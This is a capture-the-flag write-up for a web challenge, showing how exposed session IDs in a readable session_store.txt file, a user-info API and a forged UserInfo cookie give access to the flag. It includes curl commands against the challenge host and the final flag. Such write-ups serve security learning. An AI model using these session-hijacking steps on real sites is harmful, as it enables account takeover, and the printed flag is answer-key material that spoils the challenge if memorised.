## The Restricted Sessions
```
Flag is restricted to logged users only , can you be one of them.
```
- Link: http://34.77.37.110/restricted-sessions/


#### Solve:

- Steps

    - When you visit the website you will see a message telling you:
        ```
        You are not logged-in so you don't have any flag to view
        ```
  
    - I took a look at the page's source, andI noticed:
        ```
        if(document.cookie !== ''){
            $.post('getcurrentuserinfo.php',{
              'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
            },function(data){
              cu = data;
            });
        }
        ```

    - As we can see there is an API *"getcurrentuserinfo.php"* that takes a param *PHPSESSID* in POST request, but let's leep it for a while:
   
    - we can test the main page with *curl*, adding this cookie *"PHPSESSID"*:
        ```
        curl http://34.77.37.110/restricted-sessions/ --cookie "PHPSESSID=123"
        ```
        
        - Response:
        ```
        Session not found in data/session_store.txt
        ```
      
    - Interesting ! we got a file path in the response, its content:
        ```
        iuqwhe23eh23kej2hd2u3h2k23
        11l3ztdo96ritoitf9fr092ru3
        ksjdlaskjd23ljd2lkjdkasdlk
        ```
        
        - we can guess that these are different *PHPSESSID*s

    - Now we can use *curl* as previous but this time we won't set the cookie value to 123, instead we can set it to any value from the *"session_store.txt"* file.
        ```
        curl http://34.77.37.110/restricted-sessions/ --cookie "PHPSESSID=11l3ztdo96ritoitf9fr092ru3"
        ```
        
        - Response:
        ```
        UserInfo Cookie don't have the username , Validation failed   
        ```
    
    - Now we can use the api we discovered and make a POST request to it with the param *PHPSESSID* set to *"11l3ztdo96ritoitf9fr092ru3"*:
        ```
        curl -X POST http://34.77.37.110/restricted-sessions/getcurrentuserinfo.php -d "PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23"
        ```
        
        - Response:
        ```
        {"name":"john","email":"john@example.com","session_id":"iuqwhe23eh23kej2hd2u3h2k23"}
        ```
    
    - Finally we can set the cookie *UserInfo* to the name we got, in this case it's *john*, we can inject them in the browser and refresh the page then boom here you go the flag !

> **Flag: sessionareawesomebutifitsecure**